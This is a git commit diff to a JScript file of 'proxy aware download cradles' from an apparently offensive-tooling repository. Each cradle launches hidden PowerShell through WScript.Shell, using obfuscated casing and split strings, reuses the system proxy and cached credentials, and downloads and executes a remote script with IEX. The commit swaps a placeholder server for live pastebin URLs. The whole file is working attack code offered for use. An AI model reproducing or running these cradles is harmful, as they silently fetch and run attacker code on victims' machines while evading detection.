5ee800e3af412bef72fa27a276c2f77e98a05027
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2022-07-07 09:16:10 +0200

    Update Download:Cradle.js

--- Download:Cradle.js
+++ Download:Cradle.js
@@ -1,7 +1,7 @@
 #Info: Proxy Aware Download Cradle
 a=new ActiveXObject("wsCripT.sHell");
-a.run('PoWeRsHelL.eXe -NoP -w HidDen -c $a=neW-ObJeCt nET.wEbClieNt;$a.pROxy=[NeT.WeBreQueSt]::geTsyStEmweBprOxy();$a.prOxY.crEdEnTials=[NEt.crEdEnTiaLcaChe]::deFaUltcrEdeNtials;IeX $a.DOwNLOadstRiNg(\'https://server/payload.ps1\')', 0);
+a.run('PoWeRsHelL.eXe -NoP -w HidDen -c $a=neW-ObJeCt nET.wEbClieNt;$a.pROxy=[NeT.WeBreQueSt]::geTsyStEmweBprOxy();$a.prOxY.crEdEnTials=[NEt.crEdEnTiaLcaChe]::deFaUltcrEdeNtials;IeX $a.DOwNLOadstRiNg(\'https://pastebin.com/raw/88SGrHVh\')', 0);
 
 #Info: Proxy Aware Download Cradle
 c=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l");
-c.run('PoWeRsHelL.eXe -NoP -w HidDen -c $a=neW-ObJeCt nET.wEbClieNt;$a.pROxy=[NeT.WeBreQueSt]::geTsyStEmweBprOxy();$a.prOxY.crEdEnTials=[NEt.crEdEnTiaLcaChe]::deFaUltcrEdeNtials;IeX $a.DOwNLOadstRiNg(\'ht\'+\'tps://pastebin.com/raw/Qpiz8y6c\')', 0);
+c.run('PoWeRsHelL.eXe -NoP -w HidDen -c $a=neW-ObJeCt nET.wEbClieNt;$a.pROxy=[NeT.WeBreQueSt]::geTsyStEmweBprOxy();$a.prOxY.crEdEnTials=[NEt.crEdEnTiaLcaChe]::deFaUltcrEdeNtials;IeX $a.DOwNLOadstRiNg(\'ht\'+\'tps://pastebin.com/raw/88SGrHVh\')', 0);
